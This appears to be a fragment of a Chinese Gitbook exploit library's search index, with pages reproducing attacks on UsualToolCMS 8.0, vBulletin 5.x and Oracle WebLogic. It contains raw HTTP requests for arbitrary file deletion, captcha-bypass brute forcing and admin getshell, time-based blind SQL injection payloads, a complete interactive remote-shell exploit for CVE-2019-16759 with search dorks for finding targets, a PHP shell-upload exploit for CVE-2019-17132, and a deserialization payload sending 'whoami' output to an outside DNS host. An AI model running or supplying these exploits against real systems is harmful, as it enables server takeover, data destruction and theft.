('$authcode','$webname','$weblogo','$weburl','$template','$webisclose','$develop','$articlelistnum','$indexarticlenum','$indexarticlerenum','$articlehitnum','$goodslistnum','$indexgoodsnum','$indexgoodsrenum','$goodshitnum','$article','$goods','$messagebook','$orders','$members','$usercookname',now())\"; if ($mysqli->query($sqls) == TRUE) { echo \"alert('基础设置完成!');window.location.href='?l=welcome'\"; }else{ echo \"alert('未设置成功!请重填!');window.location.href='?l=setup'\"; } }?> UsualToolcsm需要先设置数据库账号密码才可以安装sql_db.php文件。 这边是判断数据库连接是否成功， 如果成功执行下一步， 如果不成功反回未设置成功!请重填 p:437-438 成功安装以后反回一个默认账号密码 echo\"后台默认账号: usualtool\"; echo\"后台默认密码: 123456\"; 直接下一步就可以因为sql_db.php是提前设置好账号密码的 http://0-sec.org/UsualToolCMS/setup/ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-05 16:06:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/1.html":{"url":"0day/UsualToolcms/1.html","title":"UsualToolcms 8.0 前台任意文件删除","keywords":"","body":"UsualToolcms前台任意文件删除 一、漏洞简介 前台myup.php文件最后一段存在任意文件删除 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 漏洞点：http://0-sec.org/myup.php 第47行只对..精心过滤，我仍然能任意删除网站内部的文件，直接构造poc， POST /UsualToolCMS/myup.php HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 25 get=delimg&imgurl=./1.php 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-05 15:47:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/2.html":{"url":"0day/UsualToolcms/2.html","title":"UsualToolcms 8.0 绕过后台验证码爆破","keywords":"","body":"UsualToolcms 8.0 绕过后台验证码爆破 一、漏洞简介 可通过删除验证码参数，进行暴力破解 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 漏洞点:http://0-sec.org/cmsadmin/ 后台登陆时默认需要输入验证码，但是当我把验证码的参数ucode删除时，登陆依然成功 1.默认情况下登陆数据包 删除ucode参数和cookie后登陆，直接登陆成功 通过burp爆破后台密码 POST /UsualToolCMS/cmsadmin/a_login.php?do=login HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_login.php X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 23 uuser=admin&upass=admin 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-05 15:48:05 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/3.html":{"url":"0day/UsualToolcms/3.html","title":"UsualToolcms 8.0 后台GETSHELL","keywords":"","body":"UsualToolcms 8.0 后台GETSHELL 一、漏洞简介 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 漏洞点:http://0-sec.org/cmsadmin/a_lang.php 13行未对$lg做判断 点击保存时抓包需要修改url处的lg参数这样就上传到跟目录了，再在post 参数的en后面加入 en\"}, POST /UsualToolCMS/cmsadmin/a_langx.php?x=m&lg=../1.php HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_langx.php?lg=lg-en.json Cookie: navleft=21; UTCMSLanguage=zh; PHPSESSID=1r5kk3jieflfbnseav3e5dnclo X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 9189 submit=%E4%BF%9D%E5%AD%98%E8%AF%AD%E8%A8%80%E5%8C%85&keys%5B%5D=language&values%5B%5D=en\"},&keys%5B%5D=charset&values%5B%5D=utf-8&keys%5B%5D=speak&values%5B%5D=English&keys%5B%5D=web&values%5B%5D=UsualToolCMS&key%5B%5D=index&value%5B%5D=Home&key%5B%5D=article&value%5B%5D=Article&key%5B%5D=product&value%5B%5D=Product&key%5B%5D=picture&value%5B%5D=Picture&key%5B%5D=atlas&value%5B%5D=Atlas&key%5B%5D=contact&value%5B%5D=Contact&key%5B%5D=about&value%5B%5D=About&key%5B%5D=forum&value%5B%5D=Forum&key%5B%5D=register&value%5B%5D=Register&key%5B%5D=login&value%5B%5D=Login&key%5B%5D=news&value%5B%5D=News&key%5B%5D=job&value%5B%5D=Job&key%5B%5D=wages&value%5B%5D=Wages&key%5B%5D=application&value%5B%5D=Application&key%5B%5D=resume&value%5B%5D=Resume&key%5B%5D=shopcart&value%5B%5D=Shopcart&key%5B%5D=account&value%5B%5D=Account&key%5B%5D=member&value%5B%5D=Member&key%5B%5D=up&value%5B%5D=Up&key%5B%5D=down&value%5B%5D=Down&key%5B%5D=more&value%5B%5D=More&key%5B%5D=new&value%5B%5D=New&key%5B%5D=authorize&value%5B%5D=Authorize&key%5B%5D=authenticating&value%5B%5D=Authenticating&key%5B%5D=qq&value%5B%5D=QQ&key%5B%5D=membercenter&value%5B%5D=Member&key%5B%5D=username&value%5B%5D=Username&key%5B%5D=password&value%5B%5D=Password&key%5B%5D=forgotpass&value%5B%5D=Forgot&key%5B%5D=search&value%5B%5D=Search&key%5B%5D=detail&value%5B%5D=Detail&key%5B%5D=size&value%5B%5D=Size&key%5B%5D=spec&value%5B%5D=Spec&key%5B%5D=color&value%5B%5D=Color&key%5B%5D=aboutus&value%5B%5D=About+Us&key%5B%5D=newgoods&value%5B%5D=New+Product&key%5B%5D=topgoods&value%5B%5D=Top+Product&key%5B%5D=link&value%5B%5D=Link&key%5B%5D=confirm&value%5B%5D=Confirm&key%5B%5D=email&value%5B%5D=Email&key%5B%5D=title&value%5B%5D=Title&key%5B%5D=content&value%5B%5D=Content&key%5B%5D=avatar&value%5B%5D=Avatar&key%5B%5D=sex&value%5B%5D=Sex&key%5B%5D=man&value%5B%5D=Man&key%5B%5D=woman&value%5B%5D=Woman&key%5B%5D=address&value%5B%5D=ADD.&key%5B%5D=tel&value%5B%5D=Tel&key%5B%5D=fax&value%5B%5D=Fax&key%5B%5D=introduction&value%5B%5D=Intro&key%5B%5D=validatecode&value%5B%5D=Captcha&key%5B%5D=changeit&value%5B%5D=Change+it&key%5B%5D=order&value%5B%5D=Order&key%5B%5D=writeorder&value%5B%5D=Write+Order&key%5B%5D=menu&value%5B%5D=Menu&key%5B%5D=balance&value%5B%5D=Balance&key%5B%5D=level&value%5B%5D=Level&key%5B%5D=writearticles&value%5B%5D=Write+Articles&key%5B%5D=articlemanagement&value%5B%5D=Article+Admin&key%5B%5D=articlebrowse&value%5B%5D=Article+Browse&key%5B%5D=writeonline&value%5B%5D=Add+New&key%5B%5D=payment&value%5B%5D=Payment&key%5B%5D=registrationtime&value%5B%5D=Reg+Time&key%5B%5D=lastlogintime&value%5B%5D=Last+Login&key%5B%5D=fullname&value%5B%5D=Full+Name&key%5B%5D=privileges%3Adiscount&value%5B%5D=Privileges%3ADiscount&key%5B%5D=state&value%5B%5D=State&key%5B%5D=source&value%5B%5D=Source&key%5B%5D=ordernumber&value%5B%5D=Order+No.&key%5B%5D=money&value%5B%5D=Money&key%5B%5D=time&value%5B%5D=Time&key%5B%5D=finish&value%5B%5D=Finish&key%5B%5D=unpaid&value%5B%5D=Unpaid&key%5B%5D=deliver&value%5B%5D=Deliver&key%5B%5D=refund&value%5B%5D=Refund&key%5B%5D=goods&value%5B%5D=Goods&key%5B%5D=charge&value%5B%5D=Charge&key%5B%5D=other&value%5B%5D=Other&key%5B%5D=ordertime&value%5B%5D=Order+Time&key%5B%5D=voucher&value%5B%5D=Voucher&key%5B%5D=customer&value%5B%5D=Customer&key%5B%5D=zipcode&value%5B%5D=Zip+Code&key%5B%5D=logistics&value%5B%5D=Logistics&key%5B%5D=logisticscompany&value%5B%5D=Company&key%5B%5D=logisticsnumber&value%5B%5D=Number&key%5B%5D=logisticsdetails&value%5B%5D=Details&key%5B%5D=paymentmethod&value%5B%5D=Method&key%5B%5D=alipay&value%5B%5D=Alipay&key%5B%5D=wechatpay&value%5B%5D=Tencent+Wechat&key%5B%5D=paypal&value%5B%5D=Paypal&key%5B%5D=waitinganswer&value%5B%5D=Waiting&key%5B%5D=answered&value%5B%5D=Answered&key%5B%5D=question&value%5B%5D=Question&key%5B%5D=reply&value%5B%5D=Reply&key%5B%5D=tencentaccount&value%5B%5D=Tencent&key%5B%5D=weiboaccount&value%5B%5D=Weibo&key%5B%5D=wechataccount&value%5B%5D=Wechat&key%5B%5D=binded&value%5B%5D=Binded&key%5B%5D=untie&value%5B%5D=Untie&key%5B%5D=quantity&value%5B%5D=Qty&key%5B%5D=parameter&value%5B%5D=Parm&key%5B%5D=total&value%5B%5D=Total&key%5B%5D=submit&value%5B%5D=Submit&key%5B%5D=delete&value%5B%5D=Del&key%5B%5D=unit&value%5B%5D=USD&key%5B%5D=actual&value%5B%5D=Actual&key%5B%5D=feedback&value%5B%5D=Feedback&key%5B%5D=otheraccount&value%5B%5D=Other+Accounts&key%5B%5D=out&value%5B%5D=Out&key%5B%5D=ranking&value%5B%5D=Ranking&key%5B%5D=recommend&value%5B%5D=Recommend&key%5B%5D=tag&value%5B%5D=Tag&key%5B%5D=tags&value%5B%5D=Tags&key%5B%5D=read&value%5B%5D=Read&key%5B%5D=productdetails&value%5B%5D=Product+Details&key%5B%5D=service&value%5B%5D=Service&key%5B%5D=category&value%5B%5D=Category&key%5B%5D=allcategory&value%5B%5D=All+Category&key%5B%5D=stock&value%5B%5D=Stock&key%5B%5D=price&value%5B%5D=Price&key%5B%5D=sale&value%5B%5D=Sale&key%5B%5D=loginview&value%5B%5D=Login+View&key%5B%5D=readme&value%5B%5D=Read+Me&key%5B%5D=popularity&value%5B%5D=Popularity&key%5B%5D=details&value%5B%5D=Details&key%5B%5D=message&value%5B%5D=Message&key%5B%5D=original&value%5B%5D=Original&key%5B%5D=author&value%5B%5D=Author&key%5B%5D=pass&value%5B%5D=Pass&key%5B%5D=audit&value%5B%5D=Audit&key%5B%5D=return&value%5B%5D=Return&key%5B%5D=yes&value%5B%5D=Yes&key%5B%5D=no&value%5B%5D=No&key%5B%5D=modify&value%5B%5D=Modify&key%5B%5D=articlemodify&value%5B%5D=Article+Modify&key%5B%5D=type&value%5B%5D=Type&key%5B%5D=moreupload&value%5B%5D=Up+to+upload&key%5B%5D=success&value%5B%5D=Success&key%5B%5D=fail&value%5B%5D=Fail&key%5B%5D=upload&value%5B%5D=Upload&key%5B%5D=uploadtime&value%5B%5D=Upload+Time&key%5B%5D=contactus&value%5B%5D=Contact+Us&key%5B%5D=previouspage&value%5B%5D=Prev&key%5B%5D=nextpage&value%5B%5D=Next&key%5B%5D=firstpage&value%5B%5D=First&key%5B%5D=lastpage&value%5B%5D=Last&key%5B%5D=totalpage&value%5B%5D=Total&key%5B%5D=currentpage&value%5B%5D=Current&key%5B%5D=buy&value%5B%5D=Buy&key%5B%5D=mailverify&value%5B%5D=Email+validation&key%5B%5D=welcome&value%5B%5D=Welcome&key%5B%5D=close&value%5B%5D=closed&key%5B%5D=findpassword&value%5B%5D=Find+Password&key%5B%5D=contactmanager&value%5B%5D=Contact+Manager&key%5B%5D=orderdetaillogin&value%5B%5D=For+order+details%2Cplease+visit+the+website.&key%5B%5D=enterusername&value%5B%5D=Please+enter+username%21&key%5B%5D=enterpassword&value%5B%5D=Please+enter+password%21&key%5B%5D=enteremail&value%5B%5D=Please+enter+Email%21&key%5B%5D=emailerr&value%5B%5D=Email+error%21&key%5B%5D=entertitle&value%5B%5D=Please+enter+title%21&key%5B%5D=entercontent&value%5B%5D=Please+enter+content%21&key%5B%5D=selecttype&value%5B%5D=Type+must+be+selected%21&key%5B%5D=enterauthor&value%5B%5D=Please+enter+author%21&key%5B%5D=enterpasswords&value%5B%5D=Please+confirm+the+password%21&key%5B%5D=passworderr&value%5B%5D=The+codes+don&key%5B%5D=entercaptcha&value%5B%5D=Please+enter+captcha%21&key%5B%5D=captchaerr&value%5B%5D=Captcha+error%21&key%5B%5D=mailsenderr&value%5B%5D=Mail+not+sent%21&key%5B%5D=mailok&value%5B%5D=Please+check+email%21&key%5B%5D=pleasemailverify&value%5B%5D=Please+check+email+for+verification%21&key%5B%5D=mailverifycode&value%5B%5D=Email+Authentication+Code&key%5B%5D=mailcopylink&value%5B%5D=Please+copy+the+following+link&key%5B%5D=totalnum&value%5B%5D=Total+Num&key%5B%5D=updateok&value%5B%5D=Update+successed%21&key%5B%5D=updateno&value%5B%5D=Failed+to+update%21&key%5B%5D=payok&value%5B%5D=Successful+payment%21&key%5B%5D=payno&value%5B%5D=Payment+Failed%21&key%5B%5D=createempty&value%5B%5D=Required+field+is+empty%21&key%5B%5D=createok&value%5B%5D=Create+successed%21&key%5B%5D=createno&value%5B%5D=Failed+to+create%21&key%5B%5D=gotopay&value%5B%5D=Go+to+pay%21&key%5B%5D=untieok&value%5B%5D=Untie+successed%21&key%5B%5D=untieno&value%5B%5D=Untie+failed%21&key%5B%5D=delok&value%5B%5D=Delete+successed%21&key%5B%5D=delno&value%5B%5D=Delete+failed%21&key%5B%5D=regclose&value%5B%5D=Website+registration+closed%21&key%5B%5D=regmailerr&value%5B%5D=Account+or+email+registered%21&key%5B%5D=loginusererr&value%5B%5D=Account+does+not+exist%21&key%5B%5D=loginpasserr&value%5B%5D=Account+or+password+does+not+match%21&key%5B%5D=administratorreply&value%5B%5D=The+administrator+has+not+responded%2C+please+wait+patiently.&key%5B%5D=noscript&value%5B%5D=Sorry%2C+your+browser+disabled+JavaScript%2C+it+may+not+be+able+to+use+some+of+the+site&key%5B%5D=readmecontent&value%5B%5D=We+guarantee+that+the+outer+packing+of+the+goods+is+in+good+condition+at+the+time+of+shipment.+When+you+receive+the+goods%2C+please+carefully+check+whether+the+invoice+and+the+goods+are+consistent+with+the+delivery+order.+If+you+find+that+the+goods+are+missing+or+damaged%2C+please+contact+our+customer+service+department+on+the+spot+when+the+delivery+personnel+are+still+on+the+scene%3B+If+you+find+that+the+package+is+damaged+or+the+goods+are+damaged+in+transit%2C+please+point+out+and+refuse+to+accept+it+on+the+spot.+After+refusal%2C+please+call+our+customer+service.+If+you+have+signed+for+it+or+someone+else+has+signed+for+it%2C+you+will+be+considered+as+the+packaging%2C+quantity+and+content+of+the+goods.+I+will+not+be+able+to+accept.&key%5B%5D=copyright&value%5B%5D=Copyright&key%5B%5D=cssdisplay&value%5B%5D=none&key%5B%5D=test&value%5B%5D=Test csrf配合上面的后台getshell history.pushState('', '', '/') 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-05 15:47:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/4.html":{"url":"0day/UsualToolcms/4.html","title":"UsualToolcms 8.0 后台盲注","keywords":"","body":"UsualToolcms 8.0 后台盲注 一、漏洞简介 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 漏洞分析 ./cmsadmin/a_users_level.php第19行和第26行，id参数可控 从get处获取id参数，id存在无任何过滤，当postt id时，通过sqlcheck函数进行过滤，来到文件./class/UsualToolCMS_INC.php第33行，将(',\\,\",null)转义，34行调用sqlchecks函数，比没过滤sql，然而a_users_level.php第19行id不是字符 复现 可以利用时间盲注来进行sql注入攻击，payload如下： a.当前数据库：http://0-sec.org:8080/UsualToolCMS/cmsadmin/a_users_level.php?x=m&id=2 and if(ascii(substr(user(),1,1))=114,sleep(6),1) b.表：http://0-sec.org:8080/UsualToolCMS/cmsadmin/a_users_level.php?x=m&id=2 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>30,sleep(6),1) 时间盲注验证脚本 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-05 16:11:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/vBulletin/1.html":{"url":"0day/vBulletin/1.html","title":"（CVE-2019-16759）vBulletin 5.x 0day pre-auth RCE exploit","keywords":"","body":"（CVE-2019-16759）vBulletin 5.x 0day pre-auth RCE exploit 一、漏洞简介 二、漏洞影响 影响版本：vBulletin 5.0.0~5.5.4 三、复现过程 poc如下: #!/usr/bin/python # # vBulletin 5.x 0day pre-auth RCE exploit # # This should work on all versions from 5.0.0 till 5.5.4 # # Google Dorks: # - site:*.vbulletin.net # - \"Powered by vBulletin Version 5.5.4\" import requests import sys if len(sys.argv) != 2: sys.exit(\"Usage: %s \" % sys.argv[0]) params = {\"routestring\":\"ajax/render/widget_php\"} while True: try: cmd = raw_input(\"vBulletin$ \") params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"'); exit;\" r = requests.post(url = sys.argv[1], data = params) if r.status_code == 200: print r.text else: sys.exit(\"Exploit failed! :(\") except KeyboardInterrupt: sys.exit(\" Closing shell...\") except Exception, e: sys.exit(str(e)) 将poc代码修改为python3使用的代码，并添加代理使用burpsuite抓包。修改的poc代码如下： # -*-coding:utf-8 -*- import requests import sys if len(sys.argv) != 2: sys.exit(\"Usage: %s \" % sys.argv[0]) proxies ={ \"http\":\"http://127.0.0.1:8080/\" } params = {\"routestring\":\"ajax/render/widget_php\"} while True: try: cmd = input(\">>>Shell= \") params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"'); exit;\" r = requests.post(url = sys.argv[1], data = params, proxies=proxies) if r.status_code == 200: print(r.text) else: sys.exit(\"Exploit failed! :(\") except KeyboardInterrupt: sys.exit(\"\\nClosing shell...\") except Exception as e: sys.exit(str(e)) 远程代码执行漏洞的触发点是未经过验证的用户通过向index.php发送routestring参数，当routesting参数是ajax/render/widget_php，通过widgetConfig[code]执行远程代码，格式为echo shell_exec('\"+cmd+\"'); exit; 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-21 20:18:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/vBulletin/2.html":{"url":"0day/vBulletin/2.html","title":"（CVE-2019-17132）vBulletin 5.0 <5.5.4-'updateAvatar'身份验证的远程代码执行漏洞","keywords":"","body":"（CVE-2019-17132）vBulletin 5.0 一、漏洞简介 用户输入更新头像的的时候，前未正确验证提交的“数据[扩展]”和“数据[文件数据]”参数就发送到了“ ajax / api / user / updateavatar”，导致此突破的产生 利用此突破可以插入和执行任意php代码。 成功利用此突破需要“将头像另存为Files（头像保存为文件）”选项要启用（可选情况下少量）。 二、漏洞影响 三、复现过程 \\n\"; print \"\\nExample....: php $argv[0] http://localhost/vb/ user passwd\"; print \"\\nExample....: php $argv[0] [url]https://vbulletin.com/[/url] evil hacker\\n\\n\"; die(); } list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]]; $ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, true); print \"\\n[-] Logging in with username '{$user}' and password '{$pass}'\\n\"; curl_setopt($ch, CURLOPT_URL, $url); if (!preg_match(\"/Cookie: .*sessionhash=[^;]+/\", curl_exec($ch), $sid)) die(\"[-] Session ID not found!\\n\"); curl_setopt($ch, CURLOPT_URL, \"{$url}?routestring=auth/login\"); curl_setopt($ch, CURLOPT_HTTPHEADER, $sid); curl_setopt($ch, CURLOPT_POSTFIELDS, \"username={$user}&password={$pass}\"); if (!preg_match(\"/Cookie: .*sessionhash=[^;]+/\", curl_exec($ch), $sid)) die(\"[-] Login failed!\\n\"); print \"[-] Logged-in! Retrieving security token...\\n\"; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, false); curl_setopt($ch, CURLOPT_HTTPHEADER, $sid); if (!preg_match('/token\": \"([^\"]+)\"/', curl_exec($ch), $token)) die(\"[-] Security token not found!\\n\"); print \"[-] Uploading new avatar...\\n\"; $params = [\"profilePhotoFile\" => new CURLFile(\"avatar.jpeg\"), \"securitytoken\" => $token[1]]; curl_setopt($ch, CURLOPT_URL, \"{$url}?routestring=profile/upload-profilepicture\"); curl_setopt($ch, CURLOPT_POSTFIELDS, $params); curl_setopt($ch, CURLOPT_HEADER, false); if (($path = (json_decode(curl_exec($ch)))->avatarpath) == null) die(\"[-] Upload failed!\\n\"); if (preg_match('/image\\.php\\?/', $path)) die(\"[-] Sorry, the 'Save Avatars as Files' option is disabled!\\n\"); print \"[-] Updating avatar with PHP shell...\\n\"; $php_code = ''; $params = [\"routestring\" => \"ajax/api/user/updateAvatar\", \"userid\" => 0, \"avatarid\" => 0, \"data[extension]\" => \"php\", \"data[filedata]\" => $php_code, \"securitytoken\" => $token[1]]; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); if (curl_exec($ch) !== \"true\") die(\"[-] Update failed!\\n\"); print \"[-] 上传shell中...\\n\"; preg_match('/(\\d+)\\.jpeg/', $path, $m); $path = preg_replace('/(\\d+)\\.jpeg/', ($m[1]+1).\".php\", $path); curl_setopt($ch, CURLOPT_URL, \"{$url}core/{$path}\"); curl_setopt($ch, CURLOPT_POST, false); while(1) { print \"\\nvb-shell# \"; if (($cmd = trim(fgets(STDIN))) == \"exit\") break; curl_setopt($ch, CURLOPT_HTTPHEADER, [\"CMD: \".base64_encode($cmd)]); preg_match('/____(.*)/s', curl_exec($ch), $m) ? print $m[1] : die(\"\\n[-] Exploit failed!\\n\"); } 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-03 17:05:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/weblogic爆破.html":{"url":"0day/Weblogic/weblogic爆破.html","title":"weblogic爆破","keywords":"","body":"weblogic爆破 一、部署weblogic 现有的redhat环境7.0,jdk版本1.7。 二、weblogic下载 操作系统：RedHat7 weblogic版本：10.3.6 三、安装weblogic 1、weblogic安装 创建一个用户 useradd weblogic passwd weblogic chmod a+x wls1036_generic.jar su weblogic java -jar wls1036_generic.jar -mode=console 出现问题 提示空间内存大小不够，清理空间再下一步。 [root@localhostsrc]# cd /usr/lib/jvm/java-1.7.0-openjdk-1.7.0.51-2.4.5.5.el7.x86_64 修改 commEnv.sh 文件 JAVA_HOME=\"/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.9.x86_64/ jre\" 2、启动weblogic [weblogic@localhostroot]$cd /home/weblogic/Oracle/Middleware/user_projects/domains/base_domain/ [weblogic@localhost base_domain]$ ./startWebLogic.sh 在目录/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.79.x86_64中找不到JRE 编辑setDomainEnv.sh 重新启动weblogic服务 四、破解weblogic控制台密码 第一步 将用户名和密码保存到boot.properties文件中 [root@localhost security]# pwd /home/weblogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security 在adminserver目录下创建security目录，并创建文件boot.properties Username=weblogic Password=weblogic123 第二步 重新启动WebLogic服务 [root@localhost bin]# ./startWebLogic.sh& 已经加密 第三步 暴力破解 1.java和javac的版本一致 2.编译WebLogicPasswordDecryptor.java 3.破解密码 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 23:37:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2017-3248）.html":{"url":"0day/Weblogic/（CVE-2017-3248）.html","title":"（CVE-2017-3248）","keywords":"","body":"CVE-2017-3248 一、漏洞简介 二、漏洞影响 WebLogic 10.3.6.0WebLogic 12.1.3.0WebLogic 12.2.1.0WebLogic 12.2.1.1 三、复现过程 http://www.0-sec.org/download/CVE-2017-3248.rar 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 22:07:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2017-3506）.html":{"url":"0day/Weblogic/（CVE-2017-3506）.html","title":"（CVE-2017-3506）","keywords":"","body":"（CVE-2017-3506） 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.2.0 三、复现过程 https://github.com/ianxtianxt/CVE-2017-3506 [*] 漏洞编号 CVE-2017-3506 & CVE-2017-10271 [*] 漏洞详情 https://www.secfree.com/article-635.html [*] 作者邮箱 Bearcat@secfree.com [*] 使用方法: [*] 单个检测 -u http://Host:Port [*] 批量检测 -f url.txt [*] 上传木马 -s http://Host:Port /wls-wsat/CoordinatorPortType11 shell.jsp [*] wls-wsat组件路径： /wls-wsat/CoordinatorPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/ParticipantPortType /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationPortTypeRPC /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/RegistrationRequesterPortType /wls-wsat/RegistrationRequesterPortType11 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 22:12:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2017-10271）.html":{"url":"0day/Weblogic/（CVE-2017-10271）.html","title":"（CVE-2017-10271）","keywords":"","body":"(CVE-2017-10271)Java反序列化漏洞 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.3.0 三、复现过程 exp https://github.com/ianxtianxt/-CVE-2017-10271- poc xml 文件 /Applications/Calculator.app/Contents/MacOS/Calculator 读取xml文件，进行反序列化执行命令代码： import java.io.BufferedInputStream; import java.io.FileInputStream; import java.io.FileNotFoundException; public class xmlrce { public static void main(String[] args) { // TODO Auto-generated method stub java.io.File file = new java.io.File(\"/Users/pirogue/IdeaProjects/weblogic/src/poc.xml\"); java.beans.XMLDecoder xd = null; try { xd = new java.beans.XMLDecoder(new BufferedInputStream(new FileInputStream(file))); } catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } Object s2 = xd.readObject(); xd.close(); } } CVE-2017-10271 weblogic反序列化漏洞 WLSServletAdapter.class public void handle(ServletContext var1, HttpServletRequest var2, HttpServletResponse var3) throws IOException { if (var2.getMethod().equals(\"GET\") || var2.getMethod().equals(\"HEAD\")) { HttpMetadataPublisher var4 = (HttpMetadataPublisher)this.endpoint.getSPI(HttpMetadataPublisher.class); if (var4 != null && var4.handleMetadataRequest(this, this.createConnection(var1, var2, var3))) { return; } if (this.isOraWsdlMetadataQuery(var2.getQueryString())) { this.publishWSDL(this.createConnection(var1, var2, var3)); return; } } super.handle(var1, var2, var3); } 当开启调试模式，ping时，WLSServletAdapter对请求进行接收处理，执行到super.handle(var1, var2, var3);后，跟进关键代码如下： WorkContentServerTube.class public NextAction processRequest(Packet var1) { this.isUseOldFormat = false; if (var1.getMessage() != null) { HeaderList var2 = var1.getMessage().getHeaders(); Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true); if (var3 != null) { this.readHeaderOld(var3); this.isUseOldFormat = true; } Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true); if (var4 != null) { this.readHeader(var4); } } return super.processRequest(var1); } 将var3传递给readHeaderOld(var3)，继续跟进readHeaderOld。 var1的值: com.sun.xml.ws.api.message.Packet@4419bacb Content: /bin/bash -c ping `whoami`.7153b738c41fxxxxxxaadf9dbd46.tu4.org WorkContextTube.class protected void readHeaderOld(Header var1) { try { XMLStreamReader var2 = var1.readHeader(); var2.nextTag(); var2.nextTag(); XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter(); ByteArrayOutputStream var4 = new ByteArrayOutputStream(); XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4); var3.bridge(var2, var5); var5.close(); WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); this.receive(var6); } catch (XMLStreamException var7) { throw new WebServiceException(var7); } catch (IOException var8) { throw new WebServiceException(var8); } } 基础知识拓展： 